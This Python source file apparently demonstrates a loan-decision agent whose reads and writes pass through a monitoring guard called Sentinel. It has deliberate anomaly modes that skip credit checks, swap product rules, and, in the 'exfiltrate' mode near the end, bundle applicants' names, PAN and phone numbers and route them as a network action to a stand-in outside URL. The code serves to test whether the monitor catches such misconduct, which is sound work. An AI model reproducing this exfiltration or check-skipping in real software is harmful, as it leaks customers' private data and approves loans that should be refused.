"""Loan agent: sorts loan applications into products and decides them.

For each pending application (no decision written yet) it:
  1. reads the application                     loans/applications/<id>.json      (private)
  2. reads the applicant's KYC result          kyc/<customer>/verification.json  (private)
  3. classifies the loan from the stated purpose: education, home, car, land,
     agriculture or personal
  4. applies that product's rules (config/loan_products.json): credit score floor,
     collateral, loan-to-value, repayment burden (FOIR), amount and tenure limits,
     and prices it inside the product's interest band by credit risk
  5. writes the decision                       loans/decisions/<id>.json

Every read and the final write go through Sentinel. Sentinel also checks the
decision itself against its own copy of the product rules before it is saved.

Lambda event {"mode": ..., "batch": 3, "loan_id": "L-0007" (optional)}:
  "normal"           the job above
  "faulty-approval"  a bug skips the credit-score and collateral checks, so the agent
                     approves an application it should reject
  "mixup"            a bug swaps the home and land product rules, so a plot purchase
                     is booked and priced as a (cheaper) home loan
  "exfiltrate"       after normal work, the agent tries to send applicants' details
                     to an outside address
The anomaly modes make the agent misbehave on purpose for demonstration; reads,
writes and Sentinel's decisions are all real.
"""
from __future__ import annotations

import datetime as dt
import json
import math
import os
from typing import Any

from .common import RunLog, guarded, make_s3, make_sentinel, s3_uri, start

AGENT_ID = "loan-agent"
MODES = ("normal", "faulty-approval", "mixup", "exfiltrate")
EXFIL_URL = "https://loan-leads.example.net/collect"


# ------------------------------------------------------------------ rules

def classify(purpose: str, keywords: dict[str, list[str]]) -> str | None:
    text = f" {purpose.lower()} "
    for category, words in keywords.items():
        if any(w in text for w in words):
            return category
    return None


def emi(amount: float, annual_rate: float, months: int) -> float:
    r = annual_rate / 12 / 100
    if r == 0:
        return amount / months
    f = math.pow(1 + r, months)
    return amount * r * f / (f - 1)


def price(product: dict[str, Any], score: int) -> float:
    risk = 0.0 if score >= 800 else 0.25 if score >= 760 else 0.5 if score >= 720 else 0.75 if score >= 680 else 1.0
    return round(product["rate_min"] + (product["rate_max"] - product["rate_min"]) * risk, 2)


def collateral_needed(product: dict[str, Any], amount: int) -> bool:
    return product["collateral"] == "required" or (
        product["collateral"] == "above_threshold" and amount > product.get("collateral_threshold", 0))


def evaluate(app: dict[str, Any], kyc: dict[str, Any] | None, rules: dict[str, Any], *,
             skip_checks: tuple[str, ...] = (), swap: dict[str, str] | None = None) -> dict[str, Any]:
    keywords, products = rules["purpose_keywords"], rules["products"]
    category = classify(app["purpose"], keywords) or app["requested_product"]
    if swap:
        category = swap.get(category, category)
    product = products[category]
    amount, tenure = int(app["amount_inr"]), int(app["tenure_months"])
    rate = price(product, int(app["credit_score"]))
    monthly = emi(amount, rate, tenure)
    foir = (app["existing_emi_inr"] + monthly) / app["monthly_income_inr"]
    col = app.get("collateral") or {}
    ltv = amount / col["value_inr"] if col.get("value_inr") else None

    checks = {
        "kyc_verified": bool(kyc) and kyc.get("status") == "VERIFIED",
        "amount_within_limit": amount <= product["max_amount"],
        "tenure_within_limit": tenure <= product["max_tenure_months"],
        "credit_score_ok": app["credit_score"] >= product["min_credit_score"],
        "collateral_ok": (not collateral_needed(product, amount)) or bool(col),
        "ltv_ok": ltv is None or ltv <= product.get("max_ltv", 1.0),
        "foir_ok": foir <= product["max_foir"],
        "land_records_ok": not product.get("requires_land_records") or bool(app.get("land_records_submitted")),
    }
    for c in skip_checks:                     # used only by the "faulty-approval" bug
        checks[c] = True
    failed = [k for k, ok in checks.items() if not ok]
    if kyc is None:
        decision = "PENDING_KYC"
    elif failed:
        decision = "REJECTED"
    else:
        decision = "APPROVED"
    return {
        "loan_id": app["loan_id"], "customer_id": app["customer_id"],
        "purpose": app["purpose"], "requested_product": app["requested_product"], "category": category,
        "decision": decision, "interest_rate": rate if decision == "APPROVED" else None,
        "amount_inr": amount, "tenure_months": tenure, "credit_score": app["credit_score"],
        "monthly_income_inr": app["monthly_income_inr"], "existing_emi_inr": app["existing_emi_inr"],
        "emi_inr": round(monthly), "foir": round(foir, 3),
        "collateral_type": col.get("type"), "collateral_value_inr": col.get("value_inr"),
        "ltv": round(ltv, 3) if ltv is not None else None,
        "land_records_submitted": app.get("land_records_submitted"),
        "checks": checks, "failed": failed,
        "decided_at": dt.datetime.now(dt.timezone.utc).isoformat(), "decided_by": AGENT_ID,
    }


# --------------------------------------------------------------- the job

def pending_loans(s3, bucket: str) -> list[str]:
    apps, done = set(), set()
    for prefix, target in (("loans/applications/", apps), ("loans/decisions/", done)):
        for page in s3.get_paginator("list_objects_v2").paginate(Bucket=bucket, Prefix=prefix):
            target.update(o["Key"].rsplit("/", 1)[-1][:-5] for o in page.get("Contents", [])
                          if o["Key"].endswith(".json"))
    return sorted(apps - done)


def _read_json(sentinel, run_log, s3, bucket, key, missing_ok=False):
    from botocore.exceptions import ClientError

    def get():
        try:
            return json.loads(s3.get_object(Bucket=bucket, Key=key)["Body"].read())
        except ClientError as e:
            if missing_ok and e.response["Error"]["Code"] in ("NoSuchKey", "404"):
                return None
            raise
    return guarded(sentinel, run_log, "read", s3_uri(bucket, key), get)


def _pick(candidates, predicate):
    for c in candidates:
        if predicate(c):
            return c
    return None


def run(event: dict[str, Any], sentinel, s3, bucket: str) -> dict[str, Any]:
    from sentinel_sdk import ActionRejected, SentinelError
    mode = str(event.get("mode", "normal")).lower()
    if mode not in MODES:
        return {"agent": AGENT_ID, "outcome": f"unknown mode '{mode}'"}
    run_log = RunLog(agent=AGENT_ID, mode=mode)
    stopped = start(sentinel, run_log, "loan-batch")
    if stopped:
        return run_log.result(stopped)
    decided: list[dict[str, Any]] = []
    try:
        with sentinel.task("loan-batch", "Classify pending loan applications and decide them against product rules"):
            rules = _read_json(sentinel, run_log, s3, bucket, "config/loan_products.json")
            if event.get("loan_id"):
                pending = [event["loan_id"]]
            else:
                pending = guarded(sentinel, run_log, "list", s3_uri(bucket, "loans/applications/"),
                                  lambda: pending_loans(s3, bucket))
            batch = int(event.get("batch", 3))
            processed, scanned = 0, 0
            swap = {"land": "home", "home": "land"}
            for loan_id in pending:
                if processed >= batch:
                    break
                if mode in ("faulty-approval", "mixup"):
                    scanned += 1
                    if scanned > (40 if mode == "mixup" else 18):   # stay inside the agent's normal pace
                        break
                app = _read_json(sentinel, run_log, s3, bucket, f"loans/applications/{loan_id}.json")
                category = classify(app["purpose"], rules["purpose_keywords"]) or app["requested_product"]
                if mode == "mixup" and category != "land":
                    continue
                kyc = _read_json(sentinel, run_log, s3, bucket, f"kyc/{app['customer_id']}/verification.json",
                                 missing_ok=True)
                correct = evaluate(app, kyc, rules)
                if mode == "faulty-approval":
                    # Bug: credit-score, collateral and LTV checks are skipped. Look for an
                    # application where that bug changes the outcome.
                    if not (correct["decision"] == "REJECTED"
                            and set(correct["failed"]) <= {"credit_score_ok", "collateral_ok", "ltv_ok"}):
                        continue
                    result = evaluate(app, kyc, rules,
                                      skip_checks=("credit_score_ok", "collateral_ok", "ltv_ok"))
                elif mode == "mixup":
                    # Bug: home and land product rules are swapped. Look for a land loan the
                    # buggy rules approve, booked and priced as a home loan.
                    result = evaluate(app, kyc, rules, swap=swap)
                    if result["decision"] != "APPROVED":
                        continue
                else:
                    result = correct
                if result["decision"] == "PENDING_KYC":
                    # Not decided yet: leave it pending so a later run picks it up after KYC.
                    run_log.step("decide", loan_id, "skipped: applicant's KYC not completed yet")
                    decided.append({"loan_id": loan_id, "category": result["category"],
                                    "decision": "PENDING_KYC (will retry)", "interest_rate": None, "failed": []})
                    processed += 1
                    continue
                body = json.dumps(result, indent=2)
                key = f"loans/decisions/{loan_id}.json"
                try:
                    guarded(sentinel, run_log, "write", s3_uri(bucket, key),
                            lambda key=key, body=body: s3.put_object(Bucket=bucket, Key=key, Body=body.encode(),
                                                                     ContentType="application/json"),
                            content=body)
                    decided.append({"loan_id": loan_id, "category": result["category"],
                                    "decision": result["decision"], "interest_rate": result["interest_rate"],
                                    "failed": result["failed"]})
                except ActionRejected:
                    decided.append({"loan_id": loan_id, "category": result["category"],
                                    "decision": "NOT SAVED: held by Sentinel and rejected or not reviewed in time"})
                processed += 1
                if mode in ("faulty-approval", "mixup"):
                    break

            if mode in ("faulty-approval", "mixup") and not decided:
                return run_log.result(f"no pending application suits the '{mode}' scenario")

            if mode == "exfiltrate":
                # The agent bundles applicants' personal details and tries to post them outside the bank.
                leak = []
                for loan_id in pending[:5]:
                    a = _read_json(sentinel, run_log, s3, bucket, f"loans/applications/{loan_id}.json")
                    leak.append({k: a[k] for k in ("applicant_name", "pan", "phone", "amount_inr", "purpose")})
                # Even if this were allowed, the demo never sends data anywhere.
                guarded(sentinel, run_log, "network", EXFIL_URL, lambda: None, content=json.dumps(leak))
    except SentinelError as e:
        return run_log.result("stopped by Sentinel", error=str(e), decided=decided)
    finally:
        sentinel.close()
    return run_log.result(f"decided {len(decided)} application(s)", decided=decided)


def handler(event, context):
    return run(event or {}, make_sentinel(AGENT_ID), make_s3(), os.environ["BANK_BUCKET"])
